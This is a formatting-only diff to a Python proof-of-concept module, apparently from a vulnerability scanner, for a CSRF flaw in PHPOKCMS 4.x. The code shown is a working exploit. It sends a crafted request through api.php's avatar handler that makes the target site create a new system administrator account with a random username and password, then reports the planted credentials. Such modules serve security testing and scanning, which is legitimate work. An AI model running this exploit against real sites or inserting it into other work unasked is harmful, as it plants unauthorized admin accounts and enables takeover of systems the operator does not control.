@@ -4,6 +4,7 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import random
 
+
 class Vuln(ABVuln):
     vuln_id = 'PHPOK_0005_L'  # 平台漏洞编号，留空
     name = 'PHPOKCMS 4.x CSRF'  # 漏洞名称
@@ -33,29 +34,30 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #payload根据实际情况确定
-            #注册会员后打开如下链接。
+            # payload根据实际情况确定
+            # 注册会员后打开如下链接。
             payload = "/phpok/api.php"
             s = requests.session()
             s.get(self.target + payload)
-            #生成随机注册信息
-            randstr = 'admin_' + str(random.randint(1,10000))
+            # 生成随机注册信息
+            randstr = 'admin_' + str(random.randint(1, 10000))
             data = "?c=usercp&f=avatar&data=%2fphpok%2fadmin.php%3Fc%3Dadmin%26f%3Dsave%26id%3D%26account%3D{username}%26pass%3D{password}%26email%3Dadmin%2540a1.com%26status%3D1%26if_system%3D1".format(
                 username=randstr, password=randstr)
             url = self.target + payload + data
             r = s.get(url)
-            
-            #然后登录管理员后台，点击会员（此时一个名为randstr 密码为randstr的系统管理员已经添加成功。）
-            #再打开设置，管理员维护去看一下即可。
+
+            # 然后登录管理员后台，点击会员（此时一个名为randstr 密码为randstr的系统管理员已经添加成功。）
+            # 再打开设置，管理员维护去看一下即可。
             if '4a8a08f09d37b73795649038408b5f33' in r.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞，已注册管理员账号：{username}，密码：{password}'.format(
                     target=self.target, name=self.vuln.name, username=randstr, password=randstr))
-                
+
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
